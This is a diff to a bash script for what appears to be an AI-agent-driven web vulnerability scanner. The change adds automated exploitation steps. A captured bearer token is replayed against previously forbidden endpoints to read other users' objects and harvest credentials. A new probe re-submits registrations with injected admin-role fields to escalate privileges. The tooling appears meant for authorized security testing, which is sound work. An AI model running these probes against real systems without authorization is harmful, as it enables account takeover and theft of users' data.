@@ -48,7 +48,7 @@ else
   # a 200/201 (register/login/leak) is captured ONCE and applied to every later probe, so it can
   # pivot into authenticated BOLA/IDOR/priv-esc on its own. Reads the UNREDACTED response.
   agent_autoauth=0; { [ -z "${AUTH_HEADER:-}" ] && [ -z "${AUTH_COOKIE:-}" ] && [ -z "${AUTH_A:-}" ]; } && agent_autoauth=1
-  agent_captured_auth=""
+  agent_captured_auth=""; agent_self_id=""; agent_massassign_done=0
   agent_try_capture_auth() {  # $1 = raw (unredacted) response, $2 = source url
     [ "$agent_autoauth" = 1 ] && [ -z "$agent_captured_auth" ] || return 0
     local _src="${2:-}"
@@ -62,6 +62,7 @@ else
       _pj="$(_b64url_decode "$(printf '%s' "$tok" | cut -d. -f2)" 2>/dev/null)"
       _role="$(printf '%s' "$_pj" | jq -r '(.role // .isAdmin // .admin // .data.role // "?")' 2>/dev/null)"; [ -n "$_role" ] || _role="?"
       _uid="$(printf '%s' "$_pj" | jq -r '(.id // .userId // .data.id // .sub // "?")' 2>/dev/null)"; [ -n "$_uid" ] || _uid="?"
+      agent_self_id="$_uid"   # the captured (low-priv) token's own id, for cross-user BOLA detection in the sweep
       _claims="$(printf '%s' "$_pj" | grep -aoiE '"(password|hash|totpSecret|secret|privateKey|ssn|card|role|isAdmin)"' | tr -d '"' | sort -u | tr '\n' ',' | sed 's/,$//')"
       printf '[auth-captured] bearer token acquired (role=%s, id=%s) - applied to subsequent probes\n' "$_role" "$_uid" >> "$agent_log"
       if [ -n "$_claims" ] && [ "$AGENT_LOOT" = 1 ]; then
@@ -116,22 +117,51 @@ else
   agent_post_auth_sweep() {
     [ -n "$agent_captured_auth" ] || return 0
     [ "$agent_sweep_done" = 1 ] && return 0; agent_sweep_done=1
-    local u st flips="" n=0
+    local u st flips="" n=0 resp body _oid
     while IFS= read -r u; do
       [ -n "$u" ] || continue
       [ "$n" -ge "${AGENT_SWEEP_MAX:-15}" ] && break
       printf '%s' "$u" | grep -qiE "^https?://([a-z0-9._-]+\.)?${esc_domain}([:/]|$)" || continue
       n=$((n+1))
-      st="$(curl -s -o /dev/null -w '%{http_code}' -L --max-time 8 ${CURL_NET[@]+"${CURL_NET[@]}"} -H "$agent_captured_auth" "$u" 2>/dev/null || echo 000)"
+      # fetch the BODY (not just the status) so a flipped endpoint is actually looted + BOLA-checked
+      resp="$(curl -s -i -L --max-time 10 ${CURL_NET[@]+"${CURL_NET[@]}"} -H "$agent_captured_auth" "$u" 2>/dev/null | head -c 65536)"
+      st="$(_status_code "$(_http_status "$resp")")"
       case "$st" in 200|201)
         flips="$flips"$'\n'"  $u -> $st (was 401/403)"
-        if printf '%s' "$u" | grep -qiE '/[0-9]+/?([?]|$)|/[0-9a-f]{8}-[0-9a-f]{4}-'; then
+        body="$(_http_body "$resp")"
+        agent_capture_secret "$u" "$resp"   # loot creds locally (e.g. /rest/user/authentication-details/)
+        # BOLA auto-confirm: a numeric/UUID object id in the PATH, OR a UserId/ownerId in the BODY that
+        # isn't the captured (low-priv) token's own id -> an unambiguous cross-user read.
+        _oid="$(printf '%s' "$body" | grep -aoiE '"(userid|ownerid|user_id)"[[:space:]]*:[[:space:]]*[0-9]+' | grep -aoE '[0-9]+' | head -1)"
+        if printf '%s' "$u" | grep -qiE '/[0-9]+/?([?]|$)|/[0-9a-f]{8}-[0-9a-f]{4}-' \
+           || { [ -n "$_oid" ] && [ -n "$agent_self_id" ] && [ "$agent_self_id" != '?' ] && [ "$_oid" != "$agent_self_id" ]; }; then
           grep -qF "[CONFIRMED] [BOLA] $u" "$agent_file" 2>/dev/null \
-            || printf '[CONFIRMED] [BOLA] %s [status=%s] | auth-gated object readable with the captured (non-owner) token\n' "$u" "$st" >> "$agent_file"
+            || printf '[CONFIRMED] [BOLA] %s [status=%s] | auth-gated object readable with the captured (non-owner) token%s\n' "$u" "$st" "${_oid:+ (returned UserId=$_oid, token id=$agent_self_id)}" >> "$agent_file"
         fi ;;
       esac
     done < <(awk -F'\t' '$1==401||$1==403{print $3}' "${fuzz_findings_file:-/dev/null}" 2>/dev/null | awk '!seen[$0]++')
     [ -n "$flips" ] && results="$results"$'\n'"[post-auth-sweep] endpoints that opened with the captured token (re-test these for BOLA/IDOR):$flips"
+  }
+  # Companion mass-assignment probe: the instant the agent registers a CLEAN low-priv account on a
+  # user-creation endpoint, re-POST the same body with privilege fields injected (1 curl, 0 LLM
+  # rounds). If the server echoes role:admin back, that is mass assignment - confirm it automatically.
+  agent_mass_assign_probe() {  # $1=url  $2=clean-body
+    [ "$AGENT_POST" = 1 ] || return 0
+    [ "$agent_massassign_done" = 1 ] && return 0
+    printf '%s' "$1" | grep -qiE '/(users|register|signup|sign-up|account)(/|\?|$)' || return 0
+    grep -qF "[CONFIRMED] [MASS-ASSIGNMENT] $1" "$agent_file" 2>/dev/null && return 0
+    printf '%s' "$1" | grep -qiE "^https?://([a-z0-9._-]+\.)?${esc_domain}([:/]|$)" || return 0
+    agent_massassign_done=1
+    local mb resp code body
+    if printf '%s' "$2" | grep -q '}'; then mb="$(printf '%s' "$2" | sed -E 's/\}[[:space:]]*$/,"role":"admin","isAdmin":true}/')"
+    else mb='{"email":"4tadmin@example.com","password":"Pwn3d!234","role":"admin","isAdmin":true}'; fi
+    resp="$(curl -s -i -L --max-time 10 ${CURL_NET[@]+"${CURL_NET[@]}"} -H 'Content-Type: application/json' ${agent_captured_auth:+-H "$agent_captured_auth"} -X POST -d "$mb" "$1" 2>/dev/null | head -c 20000)"
+    code="$(_status_code "$(_http_status "$resp")")"; body="$(_http_body "$resp")"
+    case "$code" in 200|201)
+      if printf '%s' "$body" | grep -qiE '"role"[[:space:]]*:[[:space:]]*"admin"|"isadmin"[[:space:]]*:[[:space:]]*true|"admin"[[:space:]]*:[[:space:]]*true'; then
+        printf '[CONFIRMED] [MASS-ASSIGNMENT] %s [status=%s] (body: %s) | privilege field accepted and echoed (companion probe after a clean registration)\n' "$1" "$code" "$mb" >> "$agent_file"
+      fi ;;
+    esac
   }
   # Scope string for the AI: in single-host / custom-port mode, hand it the exact seed URL
   # (http://localhost:3000) so it keeps the scheme+port; otherwise the wildcard host scope.
@@ -300,6 +330,8 @@ $situation"; printf '\n=== end head ===\n'; } >> "$agent_log" 2>/dev/null
               || printf '[CONFIRMED] [MASS-ASSIGNMENT] %s %s (body: %s) | privilege field accepted and echoed in the response\n' "$purl" "$_tag" "$pbody" >> "$agent_file" ;; esac
         elif { [ "$_isreg" = 1 ] && [ "$_haspriv" = 0 ] && [ "$_hasinj" = 0 ]; } || { [ "$_issetup" = 1 ] && [ "$_hasinj" = 0 ]; }; then
           printf '[r%s] setup step (clean auth/registration or stated setup, not a finding): %s %s\n' "$round" "$pmethod" "$purl" >> "$agent_log"
+          # a clean registration is the moment to check mass assignment: re-POST with privilege fields
+          [ "$_isreg" = 1 ] && [ "$_haspriv" = 0 ] && [ "$_hasinj" = 0 ] && agent_mass_assign_probe "$purl" "$pbody"
         elif [ "$phit" = HIT ]; then
           # Record CONFIRMED once per (method,url); never on a 4xx; and not when the match is only the
           # SPA catch-all HTML shell (auth-bypass artifacts are JSON/headers, not index.html). The
